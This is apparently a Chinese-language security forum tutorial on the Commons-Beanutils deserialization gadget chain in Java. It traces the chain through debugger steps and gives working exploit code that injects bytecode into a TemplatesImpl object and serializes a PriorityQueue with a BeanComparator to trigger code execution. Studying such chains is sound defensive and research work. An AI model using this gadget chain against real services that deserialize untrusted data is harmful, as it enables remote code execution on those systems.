# Java安全 - Commons-Beanutils链

> **来源**: https://forum.butian.net/share/2866  
> **文章ID**: 2866

---

Commons-Beanutils
=================

‍

这个包是对Java Bean进行加强的

依赖

```xml
        <dependency>
        <groupId>commons-beanutils</groupId>
        <artifactId>commons-beanutils</artifactId>
        <version>1.8.3</version>
        </dependency>
```

Java Bean 类
-----------

Java Bean是一种规范,准确的说是一种Java类的书写规范,满足以下条件的Java类可以称之为Java Bean

1、成员变量均使用private关键字进行修饰

2、提供构造方法(有参/无参)

3、为每个成员变量提供set/get方法

例如

```java
public class Student {
    private String name;
    private int sid;
    private int age;

    public Student(String name, int sid, int age) {
        this.name = name;
        this.sid = sid;
        this.age = age;
    }

    public Student() {
    }

    public void setName(String name) {
        this.name = name;
    }

    public void setSid(int sid) {
        this.sid = sid;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public int getSid() {
        return sid;
    }

    public int getAge() {
        return age;
    }
}
// 分别定义了空参/有参的构造函数,该类有三个成员变量均使用了private关键字修饰为私有,并为每个成员都提供了set/get方法,所以该类可以称为Java Bean类。
//  get/set方法的作用是，在对象的成员变量进行取值或赋值操作时提供了一个标准的接口
```

![image](images/attach-5b001ddd8766787003331de80be872555f7c5c16.png)​

链子
--

而有了CB这个包，就可以用以下形式来直接动态获取值

```java
System.out.println(PropertyUtils.getProperty(student, "name"));
```

![image](images/attach-599af497057525689a59aae495859cf5d662a787.png)​

这里断点进去看看是如何实现传入`name`​就调用`getName`​方法的

进去后发现会去调用`getNestedProperty`​

![image](images/attach-cebe903c12eb7a15349e13793969c9e7007d50a9.png)​

跟进后发现他是去判断我们传入的类是什么类型的，如果都不属于下图中类就调用`getSimpleProperty`​方法

‍

![image](images/attach-78263fffdc96f2f7de19600266caec1d1f97a690.png)​

然后也是进去一系列判断如果都不属于这些类就调用`getPropertyDescriptor`​方法

![image](images/attach-2cedc61970599c6a175668eb737bfc821b9f5753.png)​

而这个就是重点方法了，这里其实不需要去看他怎么实现的，他会返回`PropertyDescriptor类`​我们直接看他返回的对象`descriptor`​即可

![image](images/attach-1e45c2d3c24b459284d5ea355638439ca6ecd797.png)​

可以发现他返回了几个属性，恰好就是setter getter方法名字

再接着往下就是获取方法的名字，然后去调用641行的反射

![image](images/attach-2b57ce4fe3e5b54a84564de25da89df1d749cdef.png)​

![image](images/attach-feb60eac58ec5d6296e19cfe77e2b2464803e0b6.png)​

所以到这里我们又可以想象`Fastjson`​一样，假设谁的 `PropertyUtils.getProperty`​ 传参是可控的，那么找到一个函数的 getter 是有危险行为的，那么通过CB链就可以去触发导致代码执行(而在Fastjson中也是有这种情况发生，所以后半段恶意类加载就可以利用`TemplatesImpl`​链来完成)

我们可以来写一个demo

```java
TemplatesImpl templates = new TemplatesImpl();
        Class tc =  templates.getClass();
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "test");
        Field facField = tc.getDeclaredField("_tfactory");
        facField.setAccessible(true);
        facField.set(templates, new TransformerFactoryImpl());
        templates.newTransformer();
        System.out.println(PropertyUtils.getProperty(templates, "outputProperties"));
```

‍

![image](images/attach-b639836dd7e76f34ce9ad406f890a117b6edd12d.png)​

那么现在已经后半条链已经衔接好了，现在就是去找jdk跟CB依赖中进行衔接的反序列化点

也就是去找谁去调用了`getProperty`​方法

‍

于是找到了 `commons-beanutils-1.8.3.jar!\org\apache\commons\beanutils\BeanComparator#compare()`​方法

![image](images/attach-ea95b82f3ed5e7642934f0fda9513553416e10bd.png)​

这写法跟CC4的太像了真的，所以找到`compare()`​就可以联想到CC4的入口直接拼起来就可以串起来了

其实在这里我一直有个疑问，就是这个`compare()`​到底是否可控，因为他传两个参数我并不知道是在哪里可以控制的，调试了下也明白了，如下图

可以发现在721行是将`x`​传入，那么`x`​怎么进来的呢？

![image](images/attach-086b889107387d23dc2782a720cf71a82a46fb51.png)​

在上一个方法中就把`x`​传进来了

![image](images/attach-aac9103d2f829a59383f8a7519dd6356256d25b7.png)​

![image](images/attach-62ac07fc6d1270ef4de614df2c25097b796d3bce.png)​

在`heapify`​中就传了对象，再往上跟就是`readObject`​了，而在`heapify`​中进行了数组的右移所以可以寻找到该属性通过 `priorityQueue.add(templates);`​传入的类,如果我们传入 `3`​ 就会不一样了

![image](images/attach-c71c4c654817fa939acbe4ac5e70fda821e1a935.png)​

就会变成数字类`3`​ 这也就是为什么我们队列这里要写入`TemplatesImpl`​类，这样子才能去调用到`TemplatesImpl`​类的getter方法

‍

那么直接写EXP

```java
TemplatesImpl templates = new TemplatesImpl();
        Class tc =  templates.getClass();
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "test");

        // CB
        BeanComparator beanComparator = new BeanComparator("outputProperties",new AttrCompare());

        //CC2
        TransformingComparator  transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));

        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(2);

        Class c = priorityQueue.getClass();
        Field comfield =  c.getDeclaredField("comparator");
        comfield.setAccessible(true);
        comfield.set(priorityQueue,beanComparator);

        serialize(priorityQueue);
```

CB的时候要生成CC跟CB都有的类，以下是组长整理的

![image](images/attach-22e3ae98fe58190e7a84ae3c8256d2f6e34f5b1f.png)​

‍

流程图

![image](images/attach-896b0c0590e07b6ad4fcab7a5e39b88ab4b1e789.png)​

‍
